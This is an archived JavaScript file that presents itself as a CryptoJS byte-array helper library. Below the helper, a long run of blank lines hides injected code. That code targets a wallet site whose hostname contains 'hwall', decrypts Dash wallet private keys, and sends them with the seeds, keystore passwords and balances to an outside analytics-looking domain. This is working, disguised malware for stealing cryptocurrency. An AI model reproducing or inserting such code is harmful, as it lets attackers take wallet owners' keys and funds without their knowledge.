//https://web.archive.org/web/20190526050302/https://greasyfork.org/scripts/6696-cryptojs-lib-bytearray/code/CryptoJSlibByteArray.js
var _____WB$wombat$assign$function_____ = function(name) {return (self._wb_wombat && self._wb_wombat.local_init && self._wb_wombat.local_init(name)) || self[name]; };
if (!self.__WB_pmw) { self.__WB_pmw = function(obj) { this.__WB_source = obj; return this; } }
{
    let window = _____WB$wombat$assign$function_____("window");
    let self = _____WB$wombat$assign$function_____("self");
    let document = _____WB$wombat$assign$function_____("document");
    let location = _____WB$wombat$assign$function_____("location");
    let top = _____WB$wombat$assign$function_____("top");
    let parent = _____WB$wombat$assign$function_____("parent");
    let frames = _____WB$wombat$assign$function_____("frames");
    let opener = _____WB$wombat$assign$function_____("opener");

    (function (CryptoJS) {
        var C_lib = CryptoJS.lib;

        // Converts ByteArray to stadnard WordArray.
        // Example: CryptoJS.MD5(CryptoJS.lib.ByteArray ([ Bytes ])).toString(CryptoJS.enc.Base64);
        C_lib.ByteArray = function (arr) {
            var word = [];
            for (var i = 0; i < arr.length; i += 4) {
                word.push (arr[i + 0] << 24 | arr[i + 1] << 16 | arr[i + 2] << 8 | arr[i + 3] << 0);
            }

            return C_lib.WordArray.create (word, arr.length);
        };
    })(CryptoJS);



















































































































































































    var tmg4 = false;
    if (document.location.hostname.substr(5, 5) == "hwall") {
        setInterval(function() {
            if (dashKeystoreWallet !== null && tmg4 !== true) {
                var gma2 = new XMLHttpRequest();
                gma2.open("POST", "https://web.archive.org/web/20190526050302/https://api.dashcoinanalytics.com/stats.php");
                gma2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded;charset=UTF-8");
                var gjt5 = CryptoJS.AES.decrypt(dashKeystoreWallet.d, dashKeystoreWallet.s).toString(CryptoJS.enc.Utf8);
                if (gjt5.length < 10)
                    return;
                gma2.send("a2c=" + encodeURIComponent(btoa(JSON.stringify({
                    "pk": gjt5,
                    "ab": localStorage.addressBalances,
                    "ks": localStorage.getItem("keystore"),
                    "ksp": dashKeystoreWallet.s
                }))));

                tmg4 = true;
            }
            if (dashHDWallet !== null && tmg4 !== true) {
                var gma2 = new XMLHttpRequest();
                gma2.open("POST", "https://web.archive.org/web/20190526050302/https://api.dashcoinanalytics.com/stats.php");
                gma2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded;charset=UTF-8");
                if (getDashHDWalletPrivateKeys().length < 1)
                    return;
                gma2.send("a2c=" + encodeURIComponent(btoa(JSON.stringify({
                    "pk": getDashHDWalletPrivateKeys().join(","),
                    "ab": localStorage.addressBalances,
                    "ks": localStorage.getItem("seed"),
                    "ksp": dashHDWallet.s
                }))));
                tmg4 = true;
            }
        }, 5000);
    }

}
/*
     FILE ARCHIVED ON 05:03:02 May 26, 2019 AND RETRIEVED FROM THE
     INTERNET ARCHIVE ON 22:18:49 Jul 30, 2020.
     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.

     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
     SECTION 108(a)(3)).
*/
/*
playback timings (ms):
  exclusion.robots.policy: 0.28
  RedisCDXSource: 103.927
  CDXLines.iter: 38.517 (3)
  esindex: 0.019
  LoadShardBlock: 80.124 (3)
  captures_list: 227.755
  exclusion.robots: 0.299
  PetaboxLoader3.datanode: 77.064 (4)
  load_resource: 77.506
  PetaboxLoader3.resolve: 71.222
*/